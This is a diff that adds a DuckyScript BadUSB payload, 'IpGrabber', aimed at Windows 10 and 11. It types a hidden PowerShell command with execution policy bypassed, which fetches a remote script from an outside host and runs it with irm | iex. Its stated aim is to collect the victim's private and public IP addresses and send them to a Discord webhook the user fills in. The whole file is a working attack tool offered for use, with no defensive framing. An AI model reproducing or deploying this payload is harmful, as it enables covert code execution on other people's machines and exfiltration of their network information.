@@ -1,0 +1,15 @@
+REM	Title: IpGrabber
+
+REM	Author: SeallDEV
+
+REM	Description: This payload will grab the targets Private and Public IP's and forward it to a Discord Webhook
+
+REM	Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='';irm https://files.seall.dev/badusb/IpGrabber.ps1 | iex
+ENTER
+
+REM     Fill in the variable to set your exfil method.
+REM     $dc is the variable that holds your Discord webhook.  
